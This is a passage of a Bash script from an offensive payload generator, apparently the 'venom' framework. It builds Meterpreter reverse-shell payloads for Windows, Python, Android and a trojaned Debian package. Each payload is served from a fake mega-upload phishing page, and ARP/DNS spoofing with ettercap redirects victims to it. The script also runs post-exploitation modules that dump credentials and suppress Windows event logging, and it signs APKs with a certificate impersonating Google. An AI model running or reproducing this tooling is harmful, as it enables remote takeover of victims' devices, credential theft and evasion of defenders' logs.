P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" FALSE "linux_hostrecon.rc" FALSE "dump_credentials_linux.rc" --width 305 --height 370) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


if [ "$P0" = "dump_credentials_linux.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/wifi_dump_linux.rb" ]; then
    echo "[✔] wifi_dump_linux.rb -> found"
    sleep 2
  else
    echo "[x] wifi_dump_linux.rb -> not found"
    sleep 1
    echo "    copy post-module to msfdb .."
    cp $IPATH/aux/msf/wifi_dump_linux.rb $pHanTom/post/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi


if [ "$P0" = "linux_hostrecon.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/linux_hostrecon.rb" ]; then
    echo "[✔] linux_hostrecon.rb -> found"
    sleep 2
  else
    echo "[x] linux_hostrecon.rb -> not found"
    sleep 1
    echo "[*] copy post-module to msfdb .."
    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi



cd $IPATH/templates/phishing
cp $InJEc12 mega[bak].html
sed "s|NaM3|$filename.py|g" mega.html > copy.html
mv copy.html $ApAcHe/index.html > /dev/null 2>&1
cd $IPATH/output
cp $filename.py $ApAcHe/$filename.py > /dev/null 2>&1
echo "[☠] loading -> Apache2Server!"
echo "---"
echo "- SEND THE URL GENERATED TO TARGET HOST"


        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$filename.py|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$filename.py $ApAcHe/$filename.py
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $filename-$srvhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$srvhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"

        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $filename-$srvhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/web_delivery[bak].py $IPATH/templates/web_delivery.py > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/$filename.py > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
# -------------------------------------------------

   else

# -------------------------------------------------
echo "[☠] Building shellcode -> $PuLK format ..."
sleep 2
tagett="2"
filename=$(zenity --title="☠ Enter PAYLOAD name ☠" --text "example: payload" --entry --width 300) > /dev/null 2>&1

# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    URIPATH : /SecPatch
    SRVHOST : $srvhost
    FORMAT  : PSH -> WINDOWS
    PAYLOAD : windows/meterpreter/reverse_tcp
    STORED  : $IPATH/output/$filename.bat

!


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
cp $IPATH/templates/web_delivery.bat $IPATH/templates/web_delivery[bak].bat


   # check if exec.ps1 exists
   if [ -e $IPATH/templates/web_delivery.bat ]; then
      echo "[☠] web_delivery.bat -> found!"
      sleep 2
 
   else

      echo "[☠] web_delivery.bat -> not found!"
      exit
      fi


cd $IPATH/templates/
echo "[☠] building -> $filename.bat"
sleep 2
# use SED to replace SRVHOST in web_delivery.py
sed "s/SRVHOST/$srvhost/g" web_delivery.bat > $filename.bat
mv $filename.bat $IPATH/output/$filename.bat
chmod +x $IPATH/output/$filename.bat


# post-exploitation
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 310) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


cd $IPATH/templates/phishing
cp $InJEc12 mega[bak].html
sed "s|NaM3|$filename.bat|g" mega.html > copy.html
mv copy.html $ApAcHe/index.html > /dev/null 2>&1
cd $IPATH/output
cp $filename.bat $ApAcHe/$filename.bat > /dev/null 2>&1
echo "[☠] loading -> Apache2Server!"
echo "---"
echo "- SEND THE URL GENERATED TO TARGET HOST"


        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$filename.bat|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$filename.bat $ApAcHe/$filename.bat
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $filename-$srvhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$srvhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $filename-$srvhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/web_delivery[bak].bat $IPATH/templates/web_delivery.bat > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/$filename.bat > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
fi

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_multi_menu
  clear
fi
}





# ----------------------------------------
# kimi - Malicious Debian Packet Creator
# author: Chaitanya Haritash (SSA-RedTeam)
# ----------------------------------------
sh_shellcode20 () {
# get user input to build the payload
echo "[☠] Enter shellcode settings!"
srvhost=$(zenity --title="☠ Enter SRVHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: Chaitanya" --width 300) > /dev/null 2>&1
VeRp=$(zenity --entry --title "☠ DEBIAN PACKET VERSION ☠" --text "example: 1.0.13" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$srvhost" ]; then srvhost="$IP";fi
if [ -z "$VeRp" ]; then VeRp="1.0.13";fi
if [ -z "$N4m" ]; then N4m="Chaitanya";fi

# display final settings to user
cat << !

    venom settings
    ──────────────
    SRVPORT : 8080
    SRVHOST : $srvhost
    FORMAT  : SH,PYTHON -> UNIX(s)
    PAYLOAD : python/meterpreter/reverse_tcp
    AGENT   : $IPATH/output/$N4m.deb

!


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files .."
sleep 2


   # check if kimi.py exists
   if [ -e $IPATH/templates/kimi_MDPC/kimi.py ]; then
      echo "[☠] MDPC-kimi.py -> found!"
      sleep 2
 
   else

      echo "[☠] MDPC-kimi.py -> not found!"
      exit
   fi


# use MDPC to build trojan agent
echo "[☠] Use MDPC-kimi to build agent .."
sleep 2
cd $IPATH/templates/kimi_MDPC
if [ "$ArCh" = "x64" ]; then
xterm -T "kimi.py (MDPC)" -geometry 110x23 -e "python kimi.py -n $N4m -V $VeRp -l $srvhost -a amd64 && sleep 2" > /dev/null 2>&1
else
xterm -T "kimi.py (MDPC)" -geometry 110x23 -e "python kimi.py -n $N4m -V $VeRp -l $srvhost -a i386 && sleep 2" > /dev/null 2>&1
fi
# move agent to the rigth directory (venom)
echo "[☠] Moving agent to output folder .."
sleep 2
mv *.deb $IPATH/output/$N4m.deb > /dev/null 2>&1
mv handler.rc $IPATH/output/handler.rc > /dev/null 2>&1
cd $IPATH/


# copy agent to apache2 and deliver it to target
echo "[☠] Execute in target: sudo dpkg -i $N4m.deb"
sleep 2


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.deb\n\nchose how to deliver: $N4m.deb" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc"
      sleep 2

   else


      # edit files nedded
      echo "[☠] copy files to webroot..."
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.deb|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.deb $ApAcHe/$N4m.deb > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.deb|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.deb $ApAcHe/$N4m.deb
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"



        else


        echo "- ATTACK VECTOR: http://$srvhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc"

        fi
   fi



sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.deb > /dev/null 2>&1
clear
cd $IPATH/
# limpar /usr/local/bin in target on exit
# rm /usr/local/bin/$N4m > /dev/null 2>&1

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_unix_menu
  clear
fi
}





# -----------------------------
# Android payload 
# ----------------------------- 
sh_shellcode21 () {

# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: SignApk" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="SignApk";fi

echo "[☠] Building shellcode -> DALVIK format ..."
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : DALVIK -> ANDROID
    PAYLOAD : android/meterpreter/reverse_tcp

!

# use metasploit to build shellcode (msf encoded)
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -a dalvik --platform Android -f raw > $IPATH/output/$N4m.apk"
sleep 2


## Sign apk application (certificate)
echo -n "${BlueF}[${GreenF}➽${BlueF}]${white} Do you wish to sign $N4m.apk Appl (y|n)?:${Reset}";read cert
if [ "$cert" = "y" ] || [ "$cert" = "Y" ] || [ "$cert" = "yes" ]; then
   imp=`which keytool`
   if [ "$?" -eq "0" ]; then
      echo "[☠] Signing $N4m.apk using keytool ..";sleep 1
      echo "[☠] keytool install found (dependencie)..";sleep 1
      cd $IPATH/output
      imp=`which zipalign`
      if [ "$?" -eq "0" ]; then
         echo "[☠] zipalign install found (dependencie)..";sleep 1
      else
         echo "${RedF}[x]${white} 'zipalign' packet NOT found (installing)..";sleep 2
         echo "";sudo apt-get install zipalign;echo ""
      fi

      ## Sign (SSL certificate) apk Banner
      # https://resources.infosecinstitute.com/lab-hacking-an-android-device-with-msfvenom/
      echo "---"
      echo "- ${YellowF}Android Apk Certificate Function:${Reset}"
      echo "- After Successfully created the .apk file, we need to sign an certificate to it,"
      echo "- because Android mobile devices are not allowing the installing of apps without"
      echo "- the signed certificate. This function uses (keytool | jarsigner | zipalign) to"
      echo "- sign our apk with an SSL certificate (google). We just need to manually input 3"
      echo "- times a SecretKey (password) when asked further head."
      echo "---"
      keytool -genkey -v -keystore $IPATH/output/my-release-key.Keystore -alias $N4m -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Android, OU=Google, O=Google, L=US, ST=NY, C=US";echo "";sleep 2
      jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $IPATH/output/my-release-key.Keystore $N4m.apk $N4m;sleep 2;echo ""
      zipalign -v 4 $IPATH/output/$N4m.apk $IPATH/output/done.apk;sleep 1;echo ""
      mv done.apk $Nam.apk > /dev/null 2>&1
      cd $IPATH
   else
      echo "${RedF}[x]${white} Abort, ${RedF}keytool${white} packet not found..";sleep 1
      echo "[☠] Please Install 'keytool' packet before continue ..";sleep 3
      sh_android_menu # <--- return to android/ios menu
   fi
fi


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.apk\n\nchose how to deliver: $N4m.apk" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
        fi
      sleep 2

   else

      # edit files nedded
      echo "[☠] Porting ALL files to apache2 webroot...";sleep 1
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.apk|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.apk $ApAcHe/$N4m.apk > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!";sleep 1
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.apk|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.apk $ApAcHe/$N4m.apk
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
           sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
          fi
        fi
   fi



sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/output/my-release-key.Keystore > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
